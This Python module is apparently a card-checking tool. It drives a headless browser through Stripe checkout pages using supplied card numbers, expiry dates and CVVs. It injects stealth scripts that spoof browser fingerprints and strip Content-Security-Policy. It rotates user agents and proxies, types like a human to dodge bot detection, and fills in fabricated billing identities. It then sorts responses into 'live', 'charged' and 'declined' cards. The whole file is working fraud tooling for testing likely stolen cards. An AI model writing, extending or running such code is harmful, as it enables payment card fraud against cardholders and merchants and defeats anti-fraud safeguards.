# -*- coding: utf-8 -*-
"""Browser-based Stripe charge using Playwright.
Techniques from DeepBypasser + Dot Bypasser:
  - Fingerprint spoofing (navigator, WebGL, canvas, plugins)
  - CSP removal via script injection
  - Stealth mode to avoid headless detection
  - Request/response interception for Stripe API
  - Comprehensive decline code parsing
  - 3DS challenge detection
"""
import asyncio
import time
import re
import random
import json

_browser = None
_pw = None

STEALTH_JS = """
() => {
    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
    Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
    Object.defineProperty(navigator, 'plugins', {
        get: () => [
            {name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer'},
            {name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai'},
            {name: 'Native Client', filename: 'internal-nacl-plugin'}
        ]
    });
    Object.defineProperty(navigator, 'platform', {get: () => 'Win32'});
    Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 8});
    Object.defineProperty(navigator, 'deviceMemory', {get: () => 8});
    Object.defineProperty(navigator, 'maxTouchPoints', {get: () => 0});

    const origQuery = window.navigator.permissions.query;
    window.navigator.permissions.query = (params) =>
        params.name === 'notifications'
            ? Promise.resolve({state: Notification.permission})
            : origQuery(params);

    const getParameter = WebGLRenderingContext.prototype.getParameter;
    WebGLRenderingContext.prototype.getParameter = function(param) {
        if (param === 37445) return 'Intel Inc.';
        if (param === 37446) return 'Intel Iris OpenGL Engine';
        return getParameter.apply(this, arguments);
    };

    const toDataURL = HTMLCanvasElement.prototype.toDataURL;
    HTMLCanvasElement.prototype.toDataURL = function(type) {
        if (type === 'image/png' || !type) {
            const ctx = this.getContext('2d');
            if (ctx) {
                const style = ctx.fillStyle;
                ctx.fillStyle = 'rgba(0,0,1,0.003)';
                ctx.fillRect(0, 0, 1, 1);
                ctx.fillStyle = style;
            }
        }
        return toDataURL.apply(this, arguments);
    };

    window.chrome = {runtime: {}, loadTimes: () => ({}), csi: () => ({})};

    const meta = document.createElement('meta');
    meta.httpEquiv = 'Content-Security-Policy';
    meta.content = "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; " +
        "script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; " +
        "connect-src * data: blob:; style-src * 'unsafe-inline' data: blob:;";
    if (document.head) document.head.appendChild(meta);

    const existingCSP = document.querySelectorAll('meta[http-equiv="Content-Security-Policy"]');
    existingCSP.forEach((el, i) => { if (i < existingCSP.length - 1) el.remove(); });
}
"""

DECLINE_CODES_LIVE = frozenset({
    "incorrect_cvc", "incorrect_zip", "insufficient_funds",
    "authentication_required", "card_velocity_exceeded",
})

DECLINE_CODES_DEAD = frozenset({
    "stolen_card", "lost_card", "fraudulent", "pickup_card",
    "restricted_card", "security_violation", "card_not_supported",
    "invalid_account", "new_account_information_available",
    "do_not_honor", "do_not_try_again", "invalid_amount",
})

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
]


async def _get_browser():
    global _browser, _pw
    if _browser and _browser.is_connected():
        return _browser
    try:
        from playwright.async_api import async_playwright
        _pw = await async_playwright().start()
        _browser = await _pw.chromium.launch(
            headless=True,
            args=[
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-dev-shm-usage",
                "--disable-gpu",
                "--disable-blink-features=AutomationControlled",
                "--disable-infobars",
                "--window-size=1920,1080",
                "--start-maximized",
            ],
        )
        return _browser
    except Exception:
        return None


async def close_browser():
    global _browser, _pw
    if _browser:
        try:
            await _browser.close()
        except Exception:
            pass
        _browser = None
    if _pw:
        try:
            await _pw.stop()
        except Exception:
            pass
        _pw = None


async def _type_human(page_or_frame, selector: str, value: str, timeout: int = 3000):
    """Type into a field character by character with human-like delays."""
    try:
        el = await page_or_frame.wait_for_selector(selector, timeout=timeout)
        if el:
            await el.click()
            await asyncio.sleep(random.uniform(0.05, 0.15))
            for ch in value:
                await page_or_frame.page.keyboard.press(ch) if hasattr(page_or_frame, 'page') else await page_or_frame.keyboard.press(ch)
                await asyncio.sleep(random.uniform(0.03, 0.08))
    except Exception:
        pass


async def _find_stripe_iframe(page, name_contains: str, timeout: int = 8000):
    """Find a Stripe Elements iframe by partial name/url match."""
    start = time.perf_counter()
    while (time.perf_counter() - start) * 1000 < timeout:
        for frame in page.frames:
            fname = (frame.name or "").lower()
            furl = (frame.url or "").lower()
            if name_contains in fname or name_contains in furl:
                return frame
        await asyncio.sleep(0.3)
    return None


def _parse_stripe_response(data: dict) -> dict | None:
    """Parse Stripe API response with comprehensive decline code handling
    inspired by DeepBypasser's decline-handler.js."""
    result = {"status": None, "response": None, "decline_code": None, "network_code": None}

    if "error" in data:
        err = data["error"]
        dc = err.get("decline_code", "")
        code = err.get("code", "")
        msg = err.get("message", "Failed")

        if "integration surface" in msg.lower() or "unsupported" in msg.lower():
            return None

        if dc in DECLINE_CODES_LIVE:
            result["status"] = "CCN"
            result["response"] = f"{dc}: {msg}"
        elif dc in DECLINE_CODES_DEAD:
            result["status"] = "DECLINED"
            result["response"] = f"{dc}: {msg}"
        elif dc:
            result["status"] = "DECLINED"
            result["response"] = f"{dc}: {msg}"
        else:
            result["status"] = "DECLINED"
            result["response"] = f"{code}: {msg}" if code else msg

        result["decline_code"] = dc or code
        return result

    pi = data.get("payment_intent") or data.get("setup_intent") or {}
    st = pi.get("status", "") or data.get("status", "")

    if st == "succeeded":
        result["status"] = "CHARGED"
        result["response"] = "Charged"
        return result

    if st == "requires_action":
        result["status"] = "3DS"
        result["response"] = "3DS Required"
        return result

    if st == "requires_payment_method":
        lpe = pi.get("last_payment_error") or pi.get("last_setup_error") or {}
        dc = lpe.get("decline_code", "")
        msg = lpe.get("message", "Declined")
        if dc in DECLINE_CODES_LIVE:
            result["status"] = "CCN"
        else:
            result["status"] = "DECLINED"
        result["response"] = f"{dc}: {msg}" if dc else msg
        result["decline_code"] = dc
        return result

    outcome = None
    charge = data.get("charge") or {}
    if isinstance(charge, dict) and "outcome" in charge:
        outcome = charge["outcome"]
    charges = data.get("charges", {})
    if isinstance(charges, dict):
        ch_data = charges.get("data", [])
        if isinstance(ch_data, list) and ch_data:
            c0 = ch_data[0]
            if isinstance(c0, dict) and "outcome" in c0:
                outcome = c0["outcome"]

    if outcome and isinstance(outcome, dict):
        net_dc = outcome.get("network_decline_code", "")
        net_adv = outcome.get("network_advice_code", "")
        reason = outcome.get("reason", "")
        seller_msg = outcome.get("seller_message", "")

        result["network_code"] = net_dc
        if reason in DECLINE_CODES_LIVE:
            result["status"] = "CCN"
        else:
            result["status"] = "DECLINED"
        result["response"] = seller_msg or reason or "Declined"
        result["decline_code"] = reason
        return result

    return None


def _parse_status_from_page(url: str, text: str) -> tuple[str, str] | None:
    lower = text.lower()
    url_l = url.lower()
    if any(kw in url_l for kw in ("success", "thank-you", "thankyou", "order-confirm")):
        return "CHARGED", "Payment Success"
    if any(kw in lower for kw in ("payment successful", "thank you for your", "order confirmed", "payment received")):
        return "CHARGED", "Payment Success"
    if "payment_intent" in lower and "succeeded" in lower:
        return "CHARGED", "Payment Success"
    return None


async def browser_charge_card(
    card: dict, checkout_url: str,
    proxy_url: str | None = None,
    timeout_ms: int = 35000,
) -> dict:
    start = time.perf_counter()
    card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
    result = {"card": card_str, "status": None, "response": None, "time": 0}

    browser = await _get_browser()
    if not browser:
        result["status"] = "ERROR"
        result["response"] = "Browser not available"
        result["time"] = round(time.perf_counter() - start, 2)
        return result

    context = None
    page = None
    try:
        proxy_cfg = None
        if proxy_url:
            proxy_cfg = {"server": proxy_url}

        ua = random.choice(USER_AGENTS)
        context = await browser.new_context(
            proxy=proxy_cfg,
            user_agent=ua,
            viewport={"width": 1920, "height": 1080},
            locale="en-US",
            timezone_id="America/New_York",
            color_scheme="light",
            java_script_enabled=True,
            bypass_csp=True,
        )

        await context.add_init_script(STEALTH_JS)

        page = await context.new_page()

        api_responses = []

        async def handle_response(response):
            url = response.url
            if "api.stripe.com" not in url and "checkout.stripe.com" not in url:
                return
            relevant_paths = (
                "/confirm", "/payment_methods", "/payment_intents",
                "/tokens", "/setup_intents", "/sources",
            )
            if not any(p in url for p in relevant_paths):
                return
            try:
                body = await response.json()
                api_responses.append({"url": url, "status": response.status, "data": body})
            except Exception:
                pass

        page.on("response", handle_response)

        await page.goto(checkout_url, wait_until="networkidle", timeout=timeout_ms)
        await asyncio.sleep(random.uniform(0.8, 1.5))

        # --- Fill card number ---
        card_filled = False
        for iframe_hint in ("cardnumber", "card-number", "number"):
            card_frame = await _find_stripe_iframe(page, iframe_hint, timeout=5000)
            if card_frame:
                await _type_human(card_frame, 'input[name="cardnumber"], input[name="number"]', card["cc"])
                card_filled = True
                break

        if not card_filled:
            selectors = [
                'input[name="cardNumber"]', 'input[name="cardnumber"]',
                'input[id="cardNumber"]', 'input[autocomplete="cc-number"]',
                'input[data-elements-stable-field-name="cardNumber"]',
                'input[placeholder*="card number" i]', 'input[placeholder*="Card" i]',
            ]
            for sel in selectors:
                try:
                    el = await page.wait_for_selector(sel, timeout=2000)
                    if el:
                        await el.click()
                        await el.type(card["cc"], delay=random.randint(30, 60))
                        card_filled = True
                        break
                except Exception:
                    continue

        # --- Fill expiry ---
        exp_str = f"{card['mm']}{card['yy']}"
        exp_filled = False
        for iframe_hint in ("exp", "expiry"):
            exp_frame = await _find_stripe_iframe(page, iframe_hint, timeout=3000)
            if exp_frame:
                await _type_human(exp_frame, 'input[name="exp-date"], input[name="expiry"]', exp_str)
                exp_filled = True
                break

        if not exp_filled:
            for sel in ['input[name="cardExpiry"]', 'input[autocomplete="cc-exp"]',
                        'input[placeholder*="MM" i]', 'input[name="exp-date"]']:
                try:
                    el = await page.query_selector(sel)
                    if el:
                        await el.click()
                        await el.type(exp_str, delay=random.randint(30, 60))
                        exp_filled = True
                        break
                except Exception:
                    continue

            if not exp_filled:
                try:
                    mm_el = await page.query_selector('select[name="exp-month"], select[autocomplete="cc-exp-month"], input[name="card_exp_month"]')
                    yy_el = await page.query_selector('select[name="exp-year"], select[autocomplete="cc-exp-year"], input[name="card_exp_year"]')
                    if mm_el and yy_el:
                        await mm_el.select_option(card["mm"])
                        await yy_el.select_option(card["yy"] if len(card["yy"]) == 4 else f"20{card['yy']}")
                        exp_filled = True
                except Exception:
                    pass

        # --- Fill CVC ---
        cvc_filled = False
        for iframe_hint in ("cvc", "cvv", "security"):
            cvc_frame = await _find_stripe_iframe(page, iframe_hint, timeout=3000)
            if cvc_frame:
                await _type_human(cvc_frame, 'input[name="cvc"], input[name="cvv"]', card["cvv"])
                cvc_filled = True
                break

        if not cvc_filled:
            for sel in ['input[name="cardCvc"]', 'input[autocomplete="cc-csc"]',
                        'input[name="cvc"]', 'input[name="cvv"]',
                        'input[placeholder*="CVC" i]', 'input[placeholder*="CVV" i]']:
                try:
                    el = await page.query_selector(sel)
                    if el:
                        await el.click()
                        await el.type(card["cvv"], delay=random.randint(30, 60))
                        cvc_filled = True
                        break
                except Exception:
                    continue

        await asyncio.sleep(random.uniform(0.3, 0.6))

        # --- Fill email ---
        try:
            for sel in ['input[name="email"]', 'input[type="email"]', 'input[id="email"]',
                        'input[autocomplete="email"]']:
                email_el = await page.query_selector(sel)
                if email_el:
                    val = await email_el.input_value()
                    if not val:
                        from billing_data import random_email
                        await email_el.fill(random_email())
                    break
        except Exception:
            pass

        # --- Fill name ---
        try:
            for sel in ['input[name="billingName"]', 'input[autocomplete="name"]',
                        'input[autocomplete="cc-name"]', 'input[name="name"]',
                        'input[id="Field-nameInput"]']:
                name_el = await page.query_selector(sel)
                if name_el:
                    val = await name_el.input_value()
                    if not val:
                        from billing_data import random_full_name
                        await name_el.fill(random_full_name())
                    break
        except Exception:
            pass

        # --- Fill phone ---
        try:
            for sel in ['input[name="phone"]', 'input[type="tel"]', 'input[autocomplete="tel"]']:
                phone_el = await page.query_selector(sel)
                if phone_el:
                    val = await phone_el.input_value()
                    if not val:
                        phone = f"+1{random.randint(200,999)}{random.randint(2000000,9999999)}"
                        await phone_el.fill(phone)
                    break
        except Exception:
            pass

        # --- Fill country if dropdown ---
        try:
            country_sel = await page.query_selector('select[name="billingCountry"], select[autocomplete="country"], select[name="country"]')
            if country_sel:
                await country_sel.select_option("US")
        except Exception:
            pass

        # --- Fill address fields ---
        try:
            from billing_data import random_address
            addr = random_address()
            addr_fields = [
                ('input[name="billingAddressLine1"], input[autocomplete="address-line1"]', addr["line1"]),
                ('input[name="billingLocality"], input[autocomplete="address-level2"]', addr["city"]),
                ('input[name="billingAdministrativeArea"], input[autocomplete="address-level1"]', addr["state"]),
                ('input[name="billingPostalCode"], input[autocomplete="postal-code"]', addr["postal_code"]),
            ]
            for sel, val in addr_fields:
                el = await page.query_selector(sel)
                if el:
                    existing = await el.input_value()
                    if not existing:
                        await el.fill(val)
        except Exception:
            pass

        await asyncio.sleep(random.uniform(0.3, 0.5))

        # --- Click submit ---
        submit_selectors = [
            'button[type="submit"]',
            'button.SubmitButton',
            'button[data-testid="hosted-payment-submit-button"]',
            '.SubmitButton-IconContainer',
            'button:has-text("Pay")',
            'button:has-text("Subscribe")',
            'button:has-text("Submit")',
            'button:has-text("Donate")',
            'button:has-text("Complete")',
            'input[type="submit"]',
        ]
        clicked = False
        for sel in submit_selectors:
            try:
                btn = await page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.scroll_into_view_if_needed()
                    await asyncio.sleep(random.uniform(0.1, 0.3))
                    await btn.click()
                    clicked = True
                    break
            except Exception:
                continue

        if not clicked:
            result["status"] = "ERROR"
            result["response"] = "Submit button not found"
            result["time"] = round(time.perf_counter() - start, 2)
            return result

        # --- Wait and process responses ---
        await asyncio.sleep(6)

        for resp in reversed(api_responses):
            parsed = _parse_stripe_response(resp["data"])
            if parsed is None:
                continue
            result["status"] = parsed["status"]
            result["response"] = parsed["response"]
            result["time"] = round(time.perf_counter() - start, 2)
            return result

        # --- Check for 3DS challenge ---
        for frame in page.frames:
            furl = (frame.url or "").lower()
            if "authenticate" in furl or "3ds" in furl or "challenge" in furl:
                result["status"] = "3DS"
                result["response"] = "3DS Challenge Detected"
                result["time"] = round(time.perf_counter() - start, 2)
                return result

        # --- Fallback: check page content ---
        try:
            await page.wait_for_load_state("networkidle", timeout=5000)
        except Exception:
            pass

        await asyncio.sleep(1)

        for resp in reversed(api_responses):
            parsed = _parse_stripe_response(resp["data"])
            if parsed is not None:
                result["status"] = parsed["status"]
                result["response"] = parsed["response"]
                result["time"] = round(time.perf_counter() - start, 2)
                return result

        page_text = await page.inner_text("body")
        page_url = page.url
        page_result = _parse_status_from_page(page_url, page_text)
        if page_result:
            result["status"], result["response"] = page_result
        else:
            error_patterns = {
                "declined": "DECLINED", "card was declined": "DECLINED",
                "insufficient funds": "CCN", "incorrect cvc": "CCN",
                "incorrect security code": "CCN", "expired": "DECLINED",
                "invalid": "DECLINED", "do not honor": "DECLINED",
                "not supported": "DECLINED", "lost card": "DECLINED",
                "stolen card": "DECLINED", "fraudulent": "DECLINED",
            }
            for pattern, status in error_patterns.items():
                if pattern in page_text.lower():
                    result["status"] = status
                    result["response"] = page_text[:120].strip()
                    break

        if result["status"] is None:
            result["status"] = "UNKNOWN"
            result["response"] = "No clear result detected"

    except Exception as e:
        result["status"] = "ERROR"
        result["response"] = str(e)[:80]
    finally:
        if page:
            try:
                await page.close()
            except Exception:
                pass
        if context:
            try:
                await context.close()
            except Exception:
                pass

    result["time"] = round(time.perf_counter() - start, 2)
    return result
